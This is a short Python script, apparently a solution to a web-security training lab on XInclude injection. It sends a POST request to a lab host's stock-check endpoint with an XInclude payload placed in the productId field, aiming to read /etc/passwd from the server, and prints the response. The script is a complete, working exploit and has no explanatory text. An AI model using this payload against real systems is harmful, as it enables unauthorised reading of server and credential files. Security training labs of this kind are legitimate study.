# Exploiting XInclude to retrieve files

import requests

url = "https://0ac40015038cdda9c0fa524b00430028.web-security-academy.net/product/stock"

cookies = {
	"session": "TVEKBTnK3v2ZyXmnHTOmth5J2WrVZexk"
}

XPATH_PAYLOAD = """<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
"""

payload = {
	"productId": XPATH_PAYLOAD,
	"storeId": "1"
}

r = requests.post(url, data=payload, cookies=cookies)

print(r.text)